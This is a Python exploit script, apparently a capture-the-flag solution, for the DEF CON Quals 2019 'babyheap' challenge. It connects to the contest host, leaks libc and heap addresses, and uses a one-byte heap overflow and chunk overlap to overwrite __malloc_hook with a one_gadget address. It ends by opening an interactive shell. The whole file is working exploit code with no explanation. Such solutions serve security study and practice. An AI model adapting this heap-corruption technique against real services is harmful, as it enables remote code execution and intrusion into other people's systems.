from ptrlib import *

def malloc(data, size):
    sock.recvuntil('Command:\n> ')
    sock.sendline('M')
    sock.recvuntil('>')
    sock.sendline(str(size))
    sock.recvuntil('>')
    sock.sendline(data)

def malloc2(data, size):
    #assert data[-1] == 0
    sock.recvuntil('Command:\n> ')
    sock.sendline('M')
    sock.recvuntil('>')
    sock.sendline(str(size))
    sock.recvuntil('>')
    sock.send(data)

def free(index):
    sock.recvuntil('Command:\n> ')
    sock.sendline('F')
    sock.recvuntil('>')
    sock.sendline(str(index))

def show(index):
    sock.recvuntil('Command:\n> ')
    sock.sendline('S')
    sock.recvuntil('> ')
    sock.sendline(str(index))
    return sock.recvline().rstrip()

#"""
libc = ELF("libc.so")
main_arena = 0x1e4c40
delta = 592
one_gadget = 0x106ef8
sock = Socket("babyheap.quals2019.oooverflow.io", 5000)
#"""
"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
main_arena = 0x3ebc40
delta = 592
one_gadget = 0x10a38c
#sock = Socket("127.0.0.1", 5000)
sock = Process(["stdbuf", "-o0", "./babyheap"])
#"""

# leak libc base and heap address
for i in range(9):
    malloc('A' * 8, 8)
for i in reversed(range(9)):
    free(i)
for i in range(9):
    if i == 5:
        malloc('', 8)
    else:
        malloc('A' * 8, 8)
addr_main_arena = u64(show(7)[8:])
addr_heap = u64(show(5))
libc_base = addr_main_arena - main_arena - delta
dump("libc base = " + hex(libc_base))
dump("addr heap = " + hex(addr_heap))

# clear
for i in reversed(range(9)):
    free(i)

# overlap chunk
malloc('A', 0xf8) # 0
malloc('B', 0xf8) # 1
malloc('C', 0xf8) # 2

payload = b'A' * 0xf8
payload += b'\x81'
free(0)
malloc(payload, 0xf8) # 0
free(1)

## write __malloc_hook to 2nd chunk
free(2)
# craft __malloc_hook
append = p64(libc_base + libc.symbol("__malloc_hook"))[:-1]
for i in range(1, len(append) + 1):
    payload = b'A' * 0xf8
    payload += p16(0x101) # size
    payload += b'X' * 6
    payload += append[:-i]
    print(payload[0xf8:])
    malloc(payload, len(payload) - 1)
    free(1)
# nullify size
malloc(b'A' * 0xff, 0x100)
free(1)
# fix size
payload = b'A' * 0xf8
payload += p16(0x101)
payload += b'\x00'
malloc2(payload, len(payload))

# link it
malloc(b'A', 0xf8) # 2
payload = p64(libc_base + one_gadget)[:-2]
#payload = p64(libc_base + libc.symbol("system"))[:-2]
dump("__malloc_hook = " + hex(libc_base + libc.symbol("__malloc_hook")))
dump("one_gadget = " + hex(libc_base + one_gadget))
malloc(payload, 0xf8) # 3 == __malloc_hook

# get the shell!
#free(2)
sock.recvuntil('Command:\n> ')
sock.sendline('M')
sock.sendline('7')

sock.interactive()
